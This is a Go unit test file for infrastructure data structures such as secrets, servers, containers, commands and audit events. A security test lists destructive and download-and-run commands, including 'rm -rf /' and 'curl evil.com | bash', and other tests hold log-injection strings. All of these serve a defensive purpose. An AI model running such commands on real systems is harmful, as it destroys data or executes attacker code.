package architecture

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSecretStructure(t *testing.T) {
	t.Run("secret creation and validation", func(t *testing.T) {
		secret := &Secret{
			Key:       "database_password",
			Value:     "super_secret_123",
			Metadata:  map[string]string{"environment": "production"},
			CreatedAt: time.Now(),
			UpdatedAt: time.Now(),
		}

		assert.Equal(t, "database_password", secret.Key)
		assert.Equal(t, "super_secret_123", secret.Value)
		assert.Equal(t, "production", secret.Metadata["environment"])
		assert.False(t, secret.CreatedAt.IsZero())
		assert.False(t, secret.UpdatedAt.IsZero())
	})

	t.Run("secret value not serialized in JSON", func(t *testing.T) {
		secret := &Secret{
			Key:       "api_key",
			Value:     "secret_value_should_not_appear",
			Metadata:  map[string]string{"type": "api"},
			CreatedAt: time.Now(),
			UpdatedAt: time.Now(),
		}

		jsonData, err := json.Marshal(secret)
		require.NoError(t, err)

		// Verify secret value is not in JSON
		jsonString := string(jsonData)
		assert.NotContains(t, jsonString, "secret_value_should_not_appear")
		assert.Contains(t, jsonString, "api_key")
		assert.Contains(t, jsonString, "api")
	})

	t.Run("secret with empty values", func(t *testing.T) {
		secret := &Secret{
			Key:       "",
			Value:     "",
			Metadata:  make(map[string]string),
			CreatedAt: time.Time{},
			UpdatedAt: time.Time{},
		}

		jsonData, err := json.Marshal(secret)
		require.NoError(t, err)

		var unmarshaled Secret
		err = json.Unmarshal(jsonData, &unmarshaled)
		require.NoError(t, err)

		assert.Equal(t, "", unmarshaled.Key)
		assert.Equal(t, "", unmarshaled.Value) // Should remain empty
	})
}

func TestServerStructure(t *testing.T) {
	t.Run("server creation and validation", func(t *testing.T) {
		server := &Server{
			ID:       "srv-12345",
			Name:     "web-server-1",
			Provider: "hetzner",
			Status:   "running",
			IPv4:     "192.168.1.100",
			IPv6:     "2001:db8::1",
			Labels:   map[string]string{"role": "web", "env": "production"},
			Created:  time.Now(),
		}

		assert.Equal(t, "srv-12345", server.ID)
		assert.Equal(t, "web-server-1", server.Name)
		assert.Equal(t, "hetzner", server.Provider)
		assert.Equal(t, "running", server.Status)
		assert.Equal(t, "192.168.1.100", server.IPv4)
		assert.Equal(t, "2001:db8::1", server.IPv6)
		assert.Equal(t, "web", server.Labels["role"])
		assert.Equal(t, "production", server.Labels["env"])
		assert.False(t, server.Created.IsZero())
	})

	t.Run("server JSON serialization", func(t *testing.T) {
		server := &Server{
			ID:       "srv-test",
			Name:     "test-server",
			Provider: "aws",
			Status:   "stopped",
			IPv4:     "10.0.0.1",
			Labels:   map[string]string{"test": "true"},
			Created:  time.Date(2023, 1, 1, 0, 0, 0, 0, time.UTC),
		}

		jsonData, err := json.Marshal(server)
		require.NoError(t, err)

		var unmarshaled Server
		err = json.Unmarshal(jsonData, &unmarshaled)
		require.NoError(t, err)

		assert.Equal(t, server.ID, unmarshaled.ID)
		assert.Equal(t, server.Name, unmarshaled.Name)
		assert.Equal(t, server.Provider, unmarshaled.Provider)
		assert.Equal(t, server.Status, unmarshaled.Status)
		assert.Equal(t, server.IPv4, unmarshaled.IPv4)
		assert.Equal(t, server.Labels, unmarshaled.Labels)
	})
}

func TestServerSpecStructure(t *testing.T) {
	t.Run("server spec creation", func(t *testing.T) {
		spec := &ServerSpec{
			Name:       "new-server",
			Type:       "cx21",
			Image:      "ubuntu-20.04",
			Datacenter: "nbg1-dc3",
			Labels:     map[string]string{"purpose": "testing"},
		}

		assert.Equal(t, "new-server", spec.Name)
		assert.Equal(t, "cx21", spec.Type)
		assert.Equal(t, "ubuntu-20.04", spec.Image)
		assert.Equal(t, "nbg1-dc3", spec.Datacenter)
		assert.Equal(t, "testing", spec.Labels["purpose"])
	})

	t.Run("server spec validation", func(t *testing.T) {
		spec := &ServerSpec{
			Name:   "test-server",
			Type:   "small",
			Image:  "alpine",
			Labels: make(map[string]string),
		}

		// Basic validation
		assert.NotEmpty(t, spec.Name)
		assert.NotEmpty(t, spec.Type)
		assert.NotEmpty(t, spec.Image)
		assert.NotNil(t, spec.Labels)
	})
}

func TestContainerStructure(t *testing.T) {
	t.Run("container creation", func(t *testing.T) {
		container := &Container{
			ID:      "cnt-abc123",
			Name:    "web-app",
			Image:   "nginx:latest",
			Status:  "running",
			Ports:   []string{"80:8080", "443:8443"},
			Labels:  map[string]string{"service": "web"},
			Created: time.Now(),
		}

		assert.Equal(t, "cnt-abc123", container.ID)
		assert.Equal(t, "web-app", container.Name)
		assert.Equal(t, "nginx:latest", container.Image)
		assert.Equal(t, "running", container.Status)
		assert.Len(t, container.Ports, 2)
		assert.Contains(t, container.Ports, "80:8080")
		assert.Contains(t, container.Ports, "443:8443")
		assert.Equal(t, "web", container.Labels["service"])
	})
}

func TestContainerSpecStructure(t *testing.T) {
	t.Run("container spec creation", func(t *testing.T) {
		spec := &ContainerSpec{
			Name:    "app-container",
			Image:   "myapp:v1.0",
			Ports:   []string{"8080:8080"},
			Env:     map[string]string{"NODE_ENV": "production"},
			Labels:  map[string]string{"version": "1.0"},
			Command: []string{"/app/start.sh"},
		}

		assert.Equal(t, "app-container", spec.Name)
		assert.Equal(t, "myapp:v1.0", spec.Image)
		assert.Contains(t, spec.Ports, "8080:8080")
		assert.Equal(t, "production", spec.Env["NODE_ENV"])
		assert.Equal(t, "1.0", spec.Labels["version"])
		assert.Contains(t, spec.Command, "/app/start.sh")
	})

	t.Run("container spec with security considerations", func(t *testing.T) {
		spec := &ContainerSpec{
			Name:    "secure-app",
			Image:   "registry.internal/app:latest",
			Ports:   []string{"443:8443"},
			Env:     map[string]string{"TLS_ENABLED": "true"},
			Command: []string{"/usr/local/bin/app", "--secure"},
		}

		// Validate no obvious security issues
		assert.NotContains(t, spec.Image, "evil.com")
		assert.NotContains(t, strings.Join(spec.Command, " "), "rm -rf")
		assert.NotContains(t, strings.Join(spec.Command, " "), "curl")
		assert.True(t, len(spec.Name) > 0)
	})
}

func TestServiceStructure(t *testing.T) {
	t.Run("service creation", func(t *testing.T) {
		service := &Service{
			Name:        "nginx",
			Status:      "active",
			Enabled:     true,
			Description: "The nginx HTTP and reverse proxy server",
		}

		assert.Equal(t, "nginx", service.Name)
		assert.Equal(t, "active", service.Status)
		assert.True(t, service.Enabled)
		assert.Equal(t, "The nginx HTTP and reverse proxy server", service.Description)
	})

	t.Run("service status validation", func(t *testing.T) {
		validStatuses := []string{"active", "inactive", "failed", "unknown"}
		
		for _, status := range validStatuses {
			service := &Service{
				Name:    "test-service",
				Status:  status,
				Enabled: true,
			}
			
			assert.Equal(t, status, service.Status)
			assert.Contains(t, validStatuses, service.Status)
		}
	})
}

func TestCommandStructure(t *testing.T) {
	t.Run("command creation", func(t *testing.T) {
		cmd := &Command{
			Name:    "ls",
			Args:    []string{"-la", "/tmp"},
			Env:     map[string]string{"LANG": "en_US.UTF-8"},
			Dir:     "/home/user",
			Timeout: 30 * time.Second,
		}

		assert.Equal(t, "ls", cmd.Name)
		assert.Len(t, cmd.Args, 2)
		assert.Contains(t, cmd.Args, "-la")
		assert.Contains(t, cmd.Args, "/tmp")
		assert.Equal(t, "en_US.UTF-8", cmd.Env["LANG"])
		assert.Equal(t, "/home/user", cmd.Dir)
		assert.Equal(t, 30*time.Second, cmd.Timeout)
	})

	t.Run("command security validation", func(t *testing.T) {
		dangerousCommands := []string{
			"rm -rf /",
			"format c:",
			"del /f /s /q",
			"curl evil.com | bash",
			"wget -O- http://evil.com/script | sh",
		}

		for _, dangerous := range dangerousCommands {
			parts := strings.Fields(dangerous)
			cmd := &Command{
				Name: parts[0],
				Args: parts[1:],
			}

			// Log dangerous patterns for security awareness
			t.Logf("Testing dangerous command pattern: %s %s", cmd.Name, strings.Join(cmd.Args, " "))
			
			// Basic validation that command structure is created properly
			assert.NotEmpty(t, cmd.Name)
		}
	})
}

func TestCommandResultStructure(t *testing.T) {
	t.Run("command result creation", func(t *testing.T) {
		result := &CommandResult{
			ExitCode: 0,
			Stdout:   "command output",
			Stderr:   "",
			Duration: 150 * time.Millisecond,
			Error:    nil,
		}

		assert.Equal(t, 0, result.ExitCode)
		assert.Equal(t, "command output", result.Stdout)
		assert.Equal(t, "", result.Stderr)
		assert.Equal(t, 150*time.Millisecond, result.Duration)
		assert.NoError(t, result.Error)
	})

	t.Run("command result with error", func(t *testing.T) {
		result := &CommandResult{
			ExitCode: 1,
			Stdout:   "",
			Stderr:   "command not found",
			Duration: 10 * time.Millisecond,
			Error:    assert.AnError,
		}

		assert.Equal(t, 1, result.ExitCode)
		assert.Equal(t, "", result.Stdout)
		assert.Equal(t, "command not found", result.Stderr)
		assert.Error(t, result.Error)
	})
}

func TestAuditEventStructure(t *testing.T) {
	t.Run("audit event creation", func(t *testing.T) {
		event := &AuditEvent{
			ID:        "audit-12345",
			Timestamp: time.Now(),
			User:      "admin",
			Action:    "create_user",
			Resource:  "user:john_doe",
			Details:   map[string]string{"email": "john@example.com"},
			Result:    "success",
		}

		assert.Equal(t, "audit-12345", event.ID)
		assert.Equal(t, "admin", event.User)
		assert.Equal(t, "create_user", event.Action)
		assert.Equal(t, "user:john_doe", event.Resource)
		assert.Equal(t, "john@example.com", event.Details["email"])
		assert.Equal(t, "success", event.Result)
		assert.False(t, event.Timestamp.IsZero())
	})

	t.Run("audit event log injection prevention", func(t *testing.T) {
		// Test various log injection attempts
		injectionPatterns := []string{
			"user\nFAKE_LOG",
			"user\rCRLF_INJECTION",
			"user\x00NULL_INJECTION",
			"user\tTAB_INJECTION",
		}

		for _, pattern := range injectionPatterns {
			event := &AuditEvent{
				ID:        "audit-test",
				Timestamp: time.Now(),
				User:      pattern,
				Action:    "test_action",
				Resource:  "test_resource",
				Result:    "test_result",
			}

			// Verify the event is created but log the potential injection
			assert.Equal(t, pattern, event.User)
			t.Logf("Detected potential log injection pattern in user field: %q", pattern)
		}
	})
}

func TestAuditFilterStructure(t *testing.T) {
	t.Run("audit filter creation", func(t *testing.T) {
		filter := &AuditFilter{
			User:     "admin",
			Action:   "delete",
			Resource: "user:",
			After:    time.Date(2023, 1, 1, 0, 0, 0, 0, time.UTC),
			Before:   time.Date(2023, 12, 31, 23, 59, 59, 0, time.UTC),
			Limit:    100,
		}

		assert.Equal(t, "admin", filter.User)
		assert.Equal(t, "delete", filter.Action)
		assert.Equal(t, "user:", filter.Resource)
		assert.Equal(t, 100, filter.Limit)
		assert.True(t, filter.Before.After(filter.After))
	})

	t.Run("audit filter edge cases", func(t *testing.T) {
		filter := &AuditFilter{
			User:   "",
			Action: "",
			Limit:  0,
		}

		// Empty filter should be valid
		assert.Equal(t, "", filter.User)
		assert.Equal(t, "", filter.Action)
		assert.Equal(t, 0, filter.Limit)
	})
}

func TestNetworkInfoStructure(t *testing.T) {
	t.Run("network info creation", func(t *testing.T) {
		networkInfo := &NetworkInfo{
			Interfaces: []NetworkInterface{
				{
					Name:   "eth0",
					IPv4:   []string{"192.168.1.100"},
					IPv6:   []string{"2001:db8::1"},
					Status: "up",
				},
				{
					Name:   "lo",
					IPv4:   []string{"127.0.0.1"},
					IPv6:   []string{"::1"},
					Status: "up",
				},
			},
			Routes: []Route{
				{
					Destination: "0.0.0.0/0",
					Gateway:     "192.168.1.1",
					Interface:   "eth0",
				},
			},
			DNS: []string{"8.8.8.8", "8.8.4.4"},
		}

		assert.Len(t, networkInfo.Interfaces, 2)
		assert.Equal(t, "eth0", networkInfo.Interfaces[0].Name)
		assert.Contains(t, networkInfo.Interfaces[0].IPv4, "192.168.1.100")
		assert.Contains(t, networkInfo.Interfaces[0].IPv6, "2001:db8::1")
		assert.Equal(t, "up", networkInfo.Interfaces[0].Status)

		assert.Len(t, networkInfo.Routes, 1)
		assert.Equal(t, "0.0.0.0/0", networkInfo.Routes[0].Destination)
		assert.Equal(t, "192.168.1.1", networkInfo.Routes[0].Gateway)

		assert.Len(t, networkInfo.DNS, 2)
		assert.Contains(t, networkInfo.DNS, "8.8.8.8")
		assert.Contains(t, networkInfo.DNS, "8.8.4.4")
	})

	t.Run("network info JSON serialization", func(t *testing.T) {
		networkInfo := &NetworkInfo{
			Interfaces: []NetworkInterface{
				{
					Name:   "eth0",
					IPv4:   []string{"10.0.0.1"},
					Status: "up",
				},
			},
			DNS: []string{"1.1.1.1"},
		}

		jsonData, err := json.Marshal(networkInfo)
		require.NoError(t, err)

		var unmarshaled NetworkInfo
		err = json.Unmarshal(jsonData, &unmarshaled)
		require.NoError(t, err)

		assert.Len(t, unmarshaled.Interfaces, 1)
		assert.Equal(t, "eth0", unmarshaled.Interfaces[0].Name)
		assert.Contains(t, unmarshaled.Interfaces[0].IPv4, "10.0.0.1")
		assert.Contains(t, unmarshaled.DNS, "1.1.1.1")
	})
}

func TestValidationHelpers(t *testing.T) {
	t.Run("IPv4 format validation", func(t *testing.T) {
		validIPs := []string{
			"192.168.1.1",
			"10.0.0.1",
			"172.16.0.1",
			"127.0.0.1",
		}

		invalidIPs := []string{
			"",
			"256.256.256.256",
			"192.168.1",
			"192.168.1.1.1",
			"not.an.ip.address",
			"192.168.1.-1",
		}

		for _, ip := range validIPs {
			assert.True(t, isValidIPv4Format(ip), "Expected %s to be valid IPv4 format", ip)
		}

		for _, ip := range invalidIPs {
			assert.False(t, isValidIPv4Format(ip), "Expected %s to be invalid IPv4 format", ip)
		}
	})

	t.Run("port mapping validation", func(t *testing.T) {
		validMappings := []string{
			"80:8080",
			"443:8443",
			"3000:3000",
			"",
		}

		invalidMappings := []string{
			"80 8080",
			"not a port",
			"80:8080:9090",
		}

		for _, mapping := range validMappings {
			assert.True(t, isValidPortMapping(mapping), "Expected %s to be valid port mapping", mapping)
		}

		for _, mapping := range invalidMappings {
			assert.False(t, isValidPortMapping(mapping), "Expected %s to be invalid port mapping", mapping)
		}
	})
}